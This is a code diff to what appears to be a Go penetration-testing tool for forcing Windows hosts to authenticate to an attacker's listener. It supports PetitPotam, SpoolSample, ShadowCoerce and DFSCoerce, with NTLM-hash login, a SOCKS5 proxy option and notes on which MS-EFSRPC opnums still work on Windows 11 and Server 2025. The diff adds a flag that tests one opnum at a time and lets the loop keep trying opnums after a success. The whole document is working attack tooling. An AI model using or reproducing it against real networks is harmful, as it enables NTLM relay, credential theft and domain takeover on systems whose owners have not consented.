@@ -141,6 +141,7 @@ func main() {
 		method   string
 		pipe     string
 		proxyURL string
+		opnum    int
 	)
 
 	// Configure CLI
@@ -159,6 +160,7 @@ func main() {
 	cli.Flag(&hash, "H", "hash", "", "NTLM hash (32 hex characters)")
 	cli.Flag(&method, "m", "method", "petitpotam", "Coercion method: petitpotam, spoolsample, shadowcoerce, dfscoerce")
 	cli.Flag(&pipe, "pipe", "efsrpc", "Named pipe (petitpotam only): efsrpc (universal - 1 callback on Win11/2025, 3 on Win10/2022), lsarpc (legacy), samr, netlogon, lsass")
+	cli.Flag(&opnum, "opnum", -1, "Test specific opnum only (petitpotam only): 0, 4, 5, 6, 7, 12. Default: try all")
 	cli.Flag(&proxyURL, "proxy", "", "SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)")
 	cli.Flag(&verbose, "v", "verbose", false, "Enable verbose/debug output")
 
@@ -358,7 +360,7 @@ func main() {
 	// Execute chosen coercion method
 	switch method {
 	case "petitpotam":
-		err = executePetitPotam(session, share, auth, listener, pipe)
+		err = executePetitPotam(session, share, auth, listener, pipe, opnum)
 	case "spoolsample":
 		if pipe != "lsarpc" {
 			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
@@ -403,7 +405,10 @@ func main() {
 //
 // Each opnum triggers the server to authenticate to the UNC path in the FileName parameter.
 // The attack succeeds even if some opnums are patched, as long as one works.
-func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string) error {
+//
+// Parameters:
+//   - specificOpnum: If >= 0, only test this opnum. If -1, test all opnums
+func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string, specificOpnum int) error {
 	fmt.Printf("[*] Using PetitPotam coercion technique via \\pipe\\%s\n", pipeName)
 
 	// Select the correct UUID based on the pipe being used
@@ -420,21 +425,31 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 
 	// Define PetitPotam method parameters
 	// Try all known MS-EFSRPC opnums that can trigger coercion
-	method := CoercionMethod{
-		Name:         "PetitPotam",
-		PipeName:     pipeName,
-		UUID:         uuid,
-		MajorVersion: 1,
-		MinorVersion: 0,
-		Opnums: []uint16{
+	var opnums []uint16
+	if specificOpnum >= 0 {
+		// Test only the specified opnum
+		opnums = []uint16{uint16(specificOpnum)}
+		fmt.Printf("[*] Testing ONLY opnum %d\n", specificOpnum)
+	} else {
+		// Test all opnums
+		opnums = []uint16{
 			0,  // EfsRpcOpenFileRaw - Works on Win11 with efsrpc pipe
 			4,  // EfsRpcEncryptFileSrv
 			5,  // EfsRpcDecryptFileSrv
 			6,  // EfsRpcQueryUsersOnFile
 			7,  // EfsRpcQueryRecoveryAgents
 			12, // EfsRpcFileKeyInfo
-		},
-		CreateStub: createEfsRpcStub,
+		}
+	}
+
+	method := CoercionMethod{
+		Name:         "PetitPotam",
+		PipeName:     pipeName,
+		UUID:         uuid,
+		MajorVersion: 1,
+		MinorVersion: 0,
+		Opnums:       opnums,
+		CreateStub:   createEfsRpcStub,
 	}
 
 	// Open named pipe with read+write access
@@ -520,14 +535,7 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 					fmt.Printf("[+] Opnum %d (%s) path variation %d completed successfully\n", opnum, funcName, pathIdx+1)
 				}
 				successfulOpnum = int(opnum)
-				break // Success - no need to try other paths
-			}
-		}
-
-		if successfulOpnum == int(opnum) {
-			// This opnum succeeded with one of the path variations
-			if opnum != 0 {
-				break // Found working opnum, stop trying others
+				break // Success - no need to try other paths for this opnum
 			}
 		}
 	}
